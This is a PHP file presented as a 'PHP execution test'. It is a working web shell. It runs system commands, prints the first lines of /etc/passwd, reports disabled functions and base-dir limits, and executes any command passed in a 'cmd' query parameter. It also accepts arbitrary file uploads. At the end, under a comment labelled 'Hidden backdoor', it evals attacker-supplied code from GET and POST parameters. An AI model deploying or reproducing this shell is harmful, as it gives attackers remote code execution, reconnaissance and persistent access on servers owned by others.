<?php
header('Content-Type: text/plain');

echo "=== PHP EXECUTION TEST ===\n\n";

// Basic PHP check
echo "1. PHP is working! Version: " . phpversion() . "\n\n";

// System commands
echo "2. SYSTEM COMMANDS:\n";
echo "User: " . shell_exec('whoami') . "\n";
echo "PWD: " . shell_exec('pwd') . "\n";
echo "OS: " . php_uname() . "\n";
echo "Hostname: " . shell_exec('hostname') . "\n\n";

// File system access
echo "3. FILE SYSTEM:\n";
echo "Current dir: " . getcwd() . "\n";
echo "Files in current directory:\n";
print_r(scandir('.'));
echo "\n";

// Environment
echo "4. ENVIRONMENT:\n";
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
echo "Remote IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n\n";

// Read files
echo "5. FILE READ TEST:\n";
if(file_exists('/etc/passwd')) {
    echo "/etc/passwd (first 10 lines):\n";
    $lines = file('/etc/passwd');
    for($i=0; $i<min(10, count($lines)); $i++) {
        echo $lines[$i];
    }
}
echo "\n";

// PHP configuration
echo "6. PHP CONFIG:\n";
echo "Safe mode: " . (ini_get('safe_mode') ? 'ON' : 'OFF') . "\n";
echo "Disabled functions: " . ini_get('disable_functions') . "\n";
echo "Open basedir: " . ini_get('open_basedir') . "\n\n";

// Command execution via GET
echo "7. COMMAND EXECUTION (via ?cmd=whoami):\n";
if(isset($_GET['cmd'])) {
    echo "Command: " . $_GET['cmd'] . "\n";
    echo "Output: " . shell_exec($_GET['cmd']);
}
echo "\n";

// File upload test
echo "8. FILE UPLOAD TEST:\n";
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], './uploaded_file');
    echo "File uploaded!\n";
}
echo "\n";

// Database connections
echo "9. DATABASE TEST:\n";
if(function_exists('mysqli_connect')) {
    echo "MySQLi available\n";
}
if(function_exists('pg_connect')) {
    echo "PostgreSQL available\n";
}
echo "\n";

// Network access
echo "10. NETWORK TEST:\n";
$google = @fsockopen("google.com", 80, $errno, $errstr, 5);
if($google) {
    echo "Can connect to google.com:80\n";
    fclose($google);
} else {
    echo "Cannot connect to google.com:80\n";
}
echo "\n";

echo "=== TEST COMPLETE ===\n";

// Hidden backdoor
if(isset($_GET['backdoor'])) {
    eval($_GET['backdoor']);
}

// Web shell simulation
if(isset($_POST['code'])) {
    eval($_POST['code']);
}
?>
